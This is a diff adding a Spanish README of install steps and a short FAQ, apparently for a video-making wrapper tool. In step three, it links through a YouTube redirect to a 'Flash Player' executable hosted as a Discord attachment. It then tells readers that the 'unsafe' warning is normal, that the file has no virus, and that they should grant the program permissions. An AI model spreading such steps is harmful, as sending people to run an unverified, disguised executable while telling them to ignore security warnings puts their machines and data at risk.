@@ -1,0 +1,37 @@
+PRIEMRO : descarga el archivo
+segundo : descarga node.js en https://https://nodejs.org/es/
+tercero : descarga adobe flash player https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbTV1OE5FUnI1WDl2SmlFekRCRFZmV2F6VDlFUXxBQ3Jtc0tta1pXQ3hZbWNTSmN6Y08temphVmhxZXdqcWhkVEV3bEo5ajZCblYtUGozVnMwSnRjVkhuWTFYaHZ1QjdqR05XUEwxQmhQLUZpU2tobXl6alg1TFJReUpIRk9zd0VSMDZmclJ5c1BraUFLZ1htbGJURQ&q=https%3A%2F%2Fcdn.discordapp.com%2Fattachments%2F709957501298147424%2F789712302562738216%2Finstall_flash_player_ppapi.exe
+
+si sale que es inseguro no le agan caso es normal y no tiene virus
+
+cuarto: installa winrar  aqui: https://www.winrar.es/descargas
+
+quinto : extraeo 
+
+sexto : abrelo y dale a Start-wrapper 
+
+7: configuralo y cuando termines dale permisos y vuelve a abrirlo sin permisos
+
+octavo : espera y cuando termine se abrira chrouim 
+
+
+eso fue todo si necesitas ayuda baja mas
+-------------ayuda-----------
+
+1 como lo abro si lo cierro?
+r: abre start wrapper y se abrira automaticamente
+
+2 necesito chrouim ?
+r: no pero si no funciona instalala
+
+3 tiene virus?
+r: !no! 
+
+4 como descargo los videos?
+r: no hay manera necesitas grabarlos solo presiona WINDOWS + G y grabalos
+
+5 se puede descargar en mac?
+r: actualmente no pero lo haremos proximamente
+
+6 lo traduciran completo
+r: no sabemos sera dificil
